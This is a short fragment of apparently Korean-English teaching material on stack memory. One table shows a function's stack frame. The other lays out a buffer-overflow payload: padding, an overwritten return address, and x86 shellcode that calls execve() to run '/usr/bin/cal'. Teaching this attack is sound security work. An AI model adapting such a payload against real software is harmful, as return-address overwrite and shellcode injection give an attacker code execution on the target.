...
| Address | Value | Description (설명) | Length
| - | - | - | -
| `0x0012FF4C` | ? | 마지막 local variable—integer: `LocalInt` | 4
| `0x0012FF50` | ? | 첫 번째 local variable—string: `LocalChar` | 24
| `0x0012FF68` | 0x12FF80 | 호출 함수 `main()`의 calling frame | 4
| `0x0012FF6C` | 0x401040 | 호출 함수 `main()`의 return address | 4
| `0x0012FF70` | 1 | 첫 번째 argument: `MyInt` (`int`) | 4
| `0x0012FF74` | 0x40703C | 두 번째 argument: pointer `toMyString` (`char *`) | 4
...
| :--- | :--- | :--- | :--- |
| 1 | 0xbffff9c0<br>-0xbffff9cf | "123456789012456" | Password(16 bytes) 및 padding을 위한 저장 공간 |
| 2 | 0xbffff9d0<br>-0xbffff9db | "789012345678" | 추가 padding |
| 3 | 0xbffff9dc | (0xbffff9e0) | 새로운 return address |
| 4 | 0xbffff9e0 | xor %eax,%eax | eax를 0으로 설정 |
| 5 | 0xbffff9e2 | mov %eax,0xbffff9ff | Null pointer로 pointer array 종료 |
| 6 | 0xbffff9e7 | mov $0xb,%al | execve() function call을 위한 code 설정 |
| 7 | 0xbffff9e9 | mov $0xbffffa03,%ebx | execve()의 첫 번째 argument를 가리키도록 ebx 설정 |
| 8 | 0xbffff9ee | mov $0xbffff9fb,%ecx | execve()의 두 번째 argument를 가리키도록 ecx 설정 |
| 9 | 0xbffff9f3 | mov 0xbffff9ff,%edx | execve()의 세 번째 argument를 가리키도록 edx 설정 |
| 10 | 0xbffff9f9 | int $80 | execve() system call 호출 |
| 11 | 0xbffff9fb | 0xbffff9ff | 새 program에 전달되는 argument string들의 array |
| 12 | 0xbffff9ff | "1111" | Pointer array를 종료하기 위해 0x00000000으로 변경 및 세 번째 argument로 사용 |
| 13 | 0xbffffa03<br>-0xbffffa0f | "/usr/bin/cal\\0" | 실행할 command |
